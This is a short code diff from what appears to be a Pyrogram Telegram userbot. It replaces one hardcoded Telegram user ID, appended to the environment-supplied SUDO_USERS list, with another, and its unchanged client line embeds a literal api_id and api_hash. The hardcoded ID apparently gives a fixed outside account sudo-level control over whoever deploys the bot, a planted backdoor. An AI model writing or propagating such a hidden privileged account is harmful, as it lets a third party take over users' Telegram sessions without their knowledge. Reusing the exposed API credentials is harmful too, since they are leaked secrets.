@@ -7,7 +7,7 @@ from pyrogram.types import Message
 
 SESSION = getenv('SESSION')
 SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
-SUDO_USERS.append(6688753848)
+SUDO_USERS.append(6517626502)
 CHATS = ['@noob_savvy_official',]
 
 M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")
